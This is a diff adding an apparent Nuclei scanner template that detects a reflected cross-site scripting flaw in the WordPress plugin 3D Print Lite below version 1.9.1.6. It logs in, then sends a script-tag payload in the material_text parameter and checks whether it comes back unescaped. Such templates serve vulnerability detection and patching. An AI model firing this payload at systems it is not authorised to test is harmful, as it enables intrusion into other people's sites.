@@ -1,0 +1,39 @@
+id: 3d-print-lite-xss
+
+info:
+  name: 3D Print Lite < 1.9.1.6 - Reflected Cross-Site Scripting
+  author: r3Y3r53
+  severity: medium
+  description: |
+    The plugin does not sanitise and escape some user input before outputting it back in attributes, leading to Reflected Cross-Site Scripting issues
+  remediation: Update to plugin version 1.9.1.6 or latest
+  reference:
+    - https://wpscan.com/vulnerability/5909e225-5756-472e-a2fc-3ac52c7fb909
+    - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-3dprint-lite-cross-site-scripting-1-9-1-5/
+  metadata:
+    verified: true
+    max-request: 2
+  tags: 3dprint,lite,authenticated,wpscan,xss,wordpress,wp-plugin,wp
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+      - |
+        GET /wp-admin/admin.php?page=p3dlite_materials&material_text="><script>alert(document.domain)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(content_type_2, "text/html")'
+          - 'contains(body_2, "<script>alert(document.domain)</script>")'
+          - 'contains(body_2, "3dprint-lite_page_p3dlite_materials")'
+        condition: and
+
+# digest: 4a0a00473045022000831a74255b882ba14976d3c5fb1d1c96dd33793422828678f54116ba89ed76022100baafba97229da1b1ac65261652ee6633690d20f27d6a2a4c6f0e910a971c3fb7:922c64590222798bb761d5b6d8e72950
